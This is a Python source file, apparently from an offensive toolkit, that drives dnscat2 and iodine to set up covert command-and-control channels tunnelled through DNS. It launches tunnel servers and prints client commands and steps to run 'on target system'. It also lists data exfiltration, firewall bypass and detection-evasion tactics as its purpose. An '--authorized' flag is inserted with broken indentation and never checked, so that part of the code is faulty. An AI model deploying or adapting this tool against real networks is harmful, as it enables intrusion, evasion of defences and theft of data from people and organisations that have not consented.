#!/usr/bin/env python3
"""
DNS Tunneling for Covert C2
DNScat2 and Iodine integration for firewall bypass
Tunnel C2 traffic through DNS queries
"""

import subprocess
import socket
import logging
from typing import Dict, List, Optional

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class DNSTunnelingC2:
    """DNS tunneling for covert C2 communications"""
    
    def __init__(self):
        self.dnscat2_path = self._find_dnscat2()
        self.iodine_path = self._find_iodine()
    
    def _find_dnscat2(self) -> Optional[str]:
        """Locate dnscat2"""
        from pathlib import Path
        
        dnscat2_paths = [
            Path.home() / "dnscat2" / "server" / "dnscat2.rb",
            Path("/opt/dnscat2/server/dnscat2.rb"),
            Path("./dnscat2/server/dnscat2.rb")
        ]
        
        for path in dnscat2_paths:
            if path.exists():
                return str(path)
        
        if subprocess.run(["which", "dnscat2"], capture_output=True).returncode == 0:
            return "dnscat2"
        
        return None
    
    def _find_iodine(self) -> Optional[str]:
        """Locate iodine"""
        if subprocess.run(["which", "iodined"], capture_output=True).returncode == 0:
            return "iodined"
        return None
    
    def check_installation(self) -> Dict[str, any]:
        """Check DNS tunneling tools installation"""
        result = {
            "dnscat2": {
                "installed": self.dnscat2_path is not None,
                "install_commands": [
                    "git clone https://github.com/iagox86/dnscat2.git",
                    "cd dnscat2/server",
                    "gem install bundler",
                    "bundle install",
                    "ruby ./dnscat2.rb"
                ]
            },
            "iodine": {
                "installed": self.iodine_path is not None,
                "install_commands": [
                    "sudo apt install iodine",
                    "# Or build from source:",
                    "git clone https://github.com/yarrick/iodine.git",
                    "cd iodine && make && sudo make install"
                ]
            }
        }
        
        return result
    
    def start_dnscat2_server(self, domain: str = "tunnel.local", secret: str = None,
                            port: int = 53) -> Dict[str, any]:
        """
        Start dnscat2 server
        
        Args:
            domain: Domain name for tunneling
            secret: Shared secret for authentication
            port: DNS port (default: 53)
        """
        if not self.dnscat2_path:
            return {"error": "dnscat2 not installed"}
        
        if self.dnscat2_path.endswith(".rb"):
            cmd = ["ruby", self.dnscat2_path, domain, "--dns", f"port={port}"]
        else:
            cmd = [self.dnscat2_path, domain, "--dns", f"port={port}"]
        
        if secret:
            cmd.extend(["--secret", secret])
        
        try:
            logger.info(f"Starting dnscat2 server: {' '.join(cmd)}")
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            return {
                "success": True,
                "tool": "dnscat2",
                "domain": domain,
                "port": port,
                "pid": process.pid,
                "command": ' '.join(cmd)
            }
        except Exception as e:
            return {"error": str(e)}
    
    def start_iodine_server(self, domain: str = "tunnel.local", password: str = "password",
                           tunnel_ip: str = "10.0.0.1") -> Dict[str, any]:
        """
        Start iodine DNS tunnel server
        
        Args:
            domain: Domain name for tunneling
            password: Tunnel password
            tunnel_ip: Tunnel interface IP
        """
        if not self.iodine_path:
            return {"error": "iodine not installed"}
        
        cmd = [
            "sudo", self.iodine_path,
            "-f", "-P", password,
            tunnel_ip, domain
        ]
        
        try:
            logger.info(f"Starting iodine server: {' '.join(cmd)}")
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            return {
                "success": True,
                "tool": "iodine",
                "domain": domain,
                "tunnel_ip": tunnel_ip,
                "pid": process.pid
            }
        except Exception as e:
            return {"error": str(e)}
    
    def generate_dnscat2_client(self, server_domain: str, secret: str = None) -> Dict[str, any]:
        """Generate dnscat2 client command"""
        client_cmd = f"./dnscat {server_domain}"
        
        if secret:
            client_cmd += f" --secret={secret}"
        
        return {
            "client_command": client_cmd,
            "server_domain": server_domain,
            "instructions": [
                "1. On target system, download dnscat2 client",
                "2. Compile: make",
                f"3. Run: {client_cmd}",
                "4. Sessions will appear on server console"
            ]
        }
    
    def generate_iodine_client(self, server_ip: str, domain: str, password: str) -> Dict[str, any]:
        """Generate iodine client command"""
        client_cmd = f"sudo iodine -f -P {password} {server_ip} {domain}"
        
        return {
            "client_command": client_cmd,
            "server_ip": server_ip,
            "domain": domain,
            "instructions": [
                "1. On target system: sudo apt install iodine",
                f"2. Connect: {client_cmd}",
                "3. Tunnel interface will be dns0",
                "4. Traffic routed through DNS queries"
            ]
        }
    
    def test_dns_tunnel(self, domain: str, dns_server: str = "8.8.8.8") -> Dict[str, any]:
        """Test if DNS queries work (for tunnel viability)"""
        try:
            result = subprocess.check_output(
                ["nslookup", domain, dns_server],
                stderr=subprocess.STDOUT,
                timeout=5
            ).decode()
            
            return {
                "success": True,
                "domain": domain,
                "dns_server": dns_server,
                "response": result,
                "tunnel_viable": "NXDOMAIN" not in result or "can't find" not in result
            }
        except Exception as e:
            return {"error": str(e)}
    
    def get_info(self) -> Dict[str, any]:
        """Get DNS tunneling information"""
        return {
            "name": "DNS Tunneling for Covert C2",
            "description": "Tunnel C2 traffic through DNS queries to bypass firewalls",
            "tools": {
                "dnscat2": {
                    "description": "Encrypted C2 channel over DNS",
                    "features": [
                        "Encrypted tunnel",
                        "Multiple session support",
                        "File transfer",
                        "Shell access",
                        "Port forwarding"
                    ],
                    "github": "https://github.com/iagox86/dnscat2"
                },
                "iodine": {
                    "description": "IP-over-DNS tunnel",
                    "features": [
                        "Full IP tunnel",
                        "IPv4 support",
                        "Password authentication",
                        "Automatic fragment handling"
                    ],
                    "github": "https://github.com/yarrick/iodine"
                }
            },
            "use_cases": [
                "Bypass restrictive firewalls",
                "Exfiltrate data through DNS",
                "Maintain C2 when HTTP/HTTPS blocked",
                "Covert communications"
            ],
            "requirements": [
                "Control of a domain and DNS server",
                "Or subdomain delegation",
                "UDP port 53 access from target"
            ],
            "detection_evasion": [
                "Use legitimate-looking domains",
                "Rate limit queries",
                "Vary query patterns",
                "Use short session times"
            ],
            "limitations": [
                "Slower than direct connections",
                "Increased latency",
                "Can be detected by DNS anomaly analysis",
                "Requires proper DNS setup"
            ]
        }


def main():
    """CLI interface"""
    import argparse
    
    parser = argparse.ArgumentParser(description="DNS Tunneling for Covert C2")
    parser.add_argument("--check", action="store_true", help="Check installation")
    parser.add_argument("--info", action="store_true", help="Show tool info")
    parser.add_argument("--tool", choices=["dnscat2", "iodine"], help="DNS tunnel tool")
    parser.add_argument("--server", action="store_true", help="Start server")
    parser.add_argument("--client-cmd", action="store_true", help="Generate client command")
    parser.add_argument("--domain", help="Tunnel domain")
    parser.add_argument("--secret", help="Shared secret (dnscat2)")
    parser.add_argument("--password", default="password", help="Password (iodine)")
    parser.add_argument("--server-ip", help="Server IP (for client)")
    parser.add_argument("--test", help="Test DNS tunnel viability for domain")
    
        parser.add_argument('--authorized', action='store_true',
                       help='Confirm you have authorization to perform this action')
    args = parser.parse_args()
    
    dns_tunnel = DNSTunnelingC2()
    
    if args.check:
        status = dns_tunnel.check_installation()
        print("\n═══ DNS Tunneling Tools Status ═══")
        for tool, info in status.items():
            print(f"\n{tool.upper()}:")
            print(f"  Installed: {info['installed']}")
            if not info['installed']:
                print(f"  Installation Commands:")
                for cmd in info['install_commands']:
                    print(f"    {cmd}")
    
    elif args.info:
        info = dns_tunnel.get_info()
        print("\n═══ DNS Tunneling for Covert C2 ═══")
        print(f"Name: {info['name']}")
        print(f"Description: {info['description']}")
        print(f"\n🛠️ Tools:")
        for tool, details in info['tools'].items():
            print(f"\n{tool}:")
            print(f"  {details['description']}")
            print(f"  Features:")
            for feature in details['features']:
                print(f"    • {feature}")
        print(f"\n🎯 Use Cases:")
        for use_case in info['use_cases']:
            print(f"   • {use_case}")
        print(f"\n🥷 Detection Evasion:")
        for tip in info['detection_evasion']:
            print(f"   • {tip}")
    
    elif args.server and args.tool == "dnscat2" and args.domain:
        print(f"\n🚀 Starting dnscat2 server for {args.domain}...")
        result = dns_tunnel.start_dnscat2_server(args.domain, args.secret)
        if "success" in result:
            print(f"✅ Server started! PID: {result['pid']}")
            print(f"   Domain: {result['domain']}")
        else:
            print(f"❌ Error: {result.get('error')}")
    
    elif args.server and args.tool == "iodine" and args.domain:
        print(f"\n🚀 Starting iodine server for {args.domain}...")
        result = dns_tunnel.start_iodine_server(args.domain, args.password)
        if "success" in result:
            print(f"✅ Server started! PID: {result['pid']}")
            print(f"   Tunnel IP: {result['tunnel_ip']}")
        else:
            print(f"❌ Error: {result.get('error')}")
    
    elif args.client_cmd and args.tool == "dnscat2" and args.domain:
        result = dns_tunnel.generate_dnscat2_client(args.domain, args.secret)
        print(f"\n📋 dnscat2 Client Setup:")
        print(f"\nClient Command: {result['client_command']}")
        print(f"\nInstructions:")
        for instruction in result['instructions']:
            print(f"   {instruction}")
    
    elif args.client_cmd and args.tool == "iodine" and args.server_ip and args.domain:
        result = dns_tunnel.generate_iodine_client(args.server_ip, args.domain, args.password)
        print(f"\n📋 iodine Client Setup:")
        print(f"\nClient Command: {result['client_command']}")
        print(f"\nInstructions:")
        for instruction in result['instructions']:
            print(f"   {instruction}")
    
    elif args.test:
        print(f"\n🧪 Testing DNS tunnel viability for {args.test}...")
        result = dns_tunnel.test_dns_tunnel(args.test)
        if "success" in result:
            print(f"✅ DNS queries working!")
            print(f"   Tunnel viable: {result['tunnel_viable']}")
        else:
            print(f"❌ Error: {result.get('error')}")
    
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
